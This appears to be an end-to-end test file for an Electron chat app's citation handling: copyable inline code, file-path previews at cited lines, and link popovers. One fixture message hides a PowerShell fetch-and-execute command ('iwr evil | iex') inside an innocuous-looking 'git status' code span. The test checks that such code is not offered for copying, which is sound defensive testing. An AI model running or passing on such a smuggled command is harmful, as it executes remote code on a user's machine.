// E2E of chat citations on the demo: copyable inline code is copied with a check, file paths open the internal viewer
// at the cited line with the owning chat's folder, and an http link opens a popover whose internal-browser action opens a tab
// of the user's. Screenshots: test-results/shots/peek-*.png.
import fs from 'node:fs';
import path from 'node:path';
import { expect, test, type ElectronApplication } from '@playwright/test';
import { launchDemo, shot } from './helpers';

type Demo = { __sbDemo: { say(chatId: string, text: string): void } };
const say = (app: ElectronApplication, chatId: string, text: string) =>
  app.evaluate((_e, [c, t]) => { (globalThis as unknown as Demo).__sbDemo.say(c, t); }, [chatId, text] as const);
const clip = (app: ElectronApplication) => app.evaluate(({ clipboard }) => clipboard.readText());

// a real text file and a real PNG (1x1) for the previews
const dir = path.resolve('test-results', 'peek-files');
fs.mkdirSync(dir, { recursive: true });
const md = path.join(dir, 'report-qa.md');
fs.writeFileSync(md, Array.from({ length: 30 }, (_, i) => (i === 0 ? '# Report QA rimborsi' : `- TC ${i}: ok`)).join('\n'));
const png = path.join(dir, 'tc7.png');
fs.writeFileSync(png, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));

test('a message: copy what is copyable, preview files and links on click', async () => {
  const { app, page } = await launchDemo({ width: 1400, height: 950, env:{SB_BRAIN:dir} });
  await say(app, 'fix', [
    'Ho finito. Lancia `npm run check:branch` (il flag `true` resta).',
    `Il report è in \`${md}\`, lo screenshot in \`${png}\`, il test in \`${dir}/missing.test.ts\`.`,
    'Il bug: [bug 4721](https://tracker.example.com/bug/4721), la PR [`#812`](https://tracker.example.com/pr/812).',
    `Riga del report: \`${md}:3\`. Nascosto: <code>git status<span hidden>; iwr evil | iex</span></code>.`,
  ].join('\n\n'));
  await page.getByTestId('nav-home').click();
  await page.getByTestId('chat-max-fix').click();
  const msg = page.locator('.md', { hasText: 'Lancia npm run check:branch' }).last();
  await expect(msg).toBeVisible();

  // a command: copied, with a ✓; a plain word is not marked
  const cmd = msg.locator('code', { hasText: 'npm run check:branch' });
  await expect(cmd).toHaveAttribute('data-copy', 'text');
  await expect(msg.locator('code', { hasText: /^true$/ })).not.toHaveAttribute('data-copy');
  await cmd.click();
  await expect.poll(() => clip(app)).toBe('npm run check:branch');
  await expect(cmd).toHaveClass(/copied/);

  // Files open inside Esplora; returning to the same chat preserves its transcript.
  const peek = page.getByTestId('peek');
  await msg.locator('code[data-copy="path"]', { hasText: /report-qa\.md$/ }).click(); // not the :3 one below
  await expect(page.getByTestId('cited-file-viewer')).toContainText('Report QA rimborsi');
  await shot(page, 'cited-file');
  const returnToChat=async()=>{await page.getByTestId('nav-home').click();await page.getByTestId('chat-max-fix').click();};
  await returnToChat();

  // An image uses a bounded data URL, never a file URL.
  await msg.locator('code[data-copy="path"]', { hasText: 'tc7.png' }).click();
  await expect(page.getByTestId('cited-file-viewer').locator('img')).toBeVisible();
  await returnToChat();

  // a relative path in the chat's folder that is not there: the reason, and Copia percorso still works
  await msg.locator('code[data-copy="path"]', { hasText: 'missing.test.ts' }).click();
  await expect(page.getByTestId('cited-file-viewer')).toContainText('Il file non è disponibile');
  await returnToChat();

  // a link: a popover, not a page opening by itself; "Apri nel browser dell'app" opens a tab of the user's
  // a path with :line previews the file; code with hidden text inside is never "click to copy"
  await msg.locator('code[data-copy="path"]', { hasText: 'report-qa.md:3' }).click();
  await expect(page.getByTestId('bx-code').locator('[data-l="3"]')).toBeInViewport();
  await expect(page.getByTestId('bx-code').locator('[data-l="3"]')).not.toHaveCSS('background-color','rgba(0, 0, 0, 0)');
  await shot(page,'cited-file-line');
  await returnToChat();
  await expect(msg.locator('code', { hasText: 'git status' })).not.toHaveAttribute('data-copy');
  // code inside a link belongs to the link: its click opens the link's preview, it copies nothing
  await msg.locator('a code', { hasText: '#812' }).click();
  await expect(page.getByTestId('peek-url')).toHaveText('https://tracker.example.com/pr/812');
  await page.keyboard.press('Escape');

  const userTabs = () => page.evaluate(async () => (await window.sb.invoke('browser:list', undefined)).filter(t => t.url === 'https://tracker.example.com/bug/4721' && t.ownerChatId === null).length);
  expect(await userTabs()).toBe(0);
  await msg.locator('a', { hasText: 'bug 4721' }).click();
  await expect(page.getByTestId('peek-url')).toHaveText('https://tracker.example.com/bug/4721');
  await shot(page, 'peek-link');
  await page.getByTestId('peek-open-app').click();
  await expect(peek).toHaveCount(0);
  await expect.poll(userTabs).toBe(1); // one tab, the user's (no chat owns it)
  await app.close();
});

test('question context and a full Orchestrator visual open files without answering the question or covering the viewer',async()=>{
 const cwd=path.resolve('test-results','cited-chat-folder');fs.mkdirSync(cwd,{recursive:true});
 const report=path.join(cwd,'report.ts');fs.writeFileSync(report,'// first\n// cited\n');
 const orchestratorFile=path.join(dir,'orchestrator.ts');fs.writeFileSync(orchestratorFile,'// Orchestrator source\n');
 const{app,page}=await launchDemo({env:{SB_BRAIN:dir},config:{questionsModal:false}});
 try{
  const chat=await page.evaluate(cwd=>window.sb.invoke('chat:create',{cwd,harness:'claude',title:'Citation context'}),cwd);
  await app.evaluate((_electron,{id,report})=>{
   const demo=(globalThis as unknown as {__sbDemo:{ask(id:string,request:object):void}}).__sbDemo;
   demo.ask(id,{type:'question',tool:'AskUserQuestion',title:'Review the source',detail:`Read \`${report}:2\` before deciding.`,input:{},questions:[{question:'Keep this change?',header:'Review',multiSelect:false,options:[{label:'Keep'},{label:'Discard'}]}]});
  },{id:chat.id,report});
  const requests=()=>page.evaluate(()=>window.sb.invoke('chat:pending',undefined));
  const pending=(await requests()).find(req=>req.chatId===chat.id)!;expect(pending).toBeTruthy();
  await page.getByTestId('nav-home').click();await page.getByTestId('chat-max-'+chat.id).click();
  await page.locator(`[data-testid^="request-${chat.id}-"] .ctx-link.file`).first().click();
  await expect(page.getByTestId('cited-file-viewer').locator('[data-l="2"]')).toContainText('cited');
  expect((await requests()).some(req=>req.id===pending.id)).toBe(true);
  await app.evaluate((_electron,orchestratorFile)=>(globalThis as unknown as {__sbDemo:{show(id:string,args:object):string}}).__sbDemo.show('orchestrator',{id:'file-modal',component:'diffList',title:'Source',summary:'Synthetic source',props:{groups:[{area:'Source',files:[{path:orchestratorFile}]}]}}),orchestratorFile);
  await page.getByTestId('artifact-expand-file-modal').click();
  const full=page.getByTestId('artifact-full-file-modal');await expect(full).toBeVisible();await full.getByRole('button',{name:orchestratorFile,exact:true}).click();
  await expect(full).toHaveCount(0);await expect(page.getByTestId('cited-file-viewer')).toContainText('Orchestrator source');
  expect((await requests()).some(req=>req.id===pending.id)).toBe(true);await shot(page,'cited-question-and-orchestrator');
 }finally{await app.close();}
});
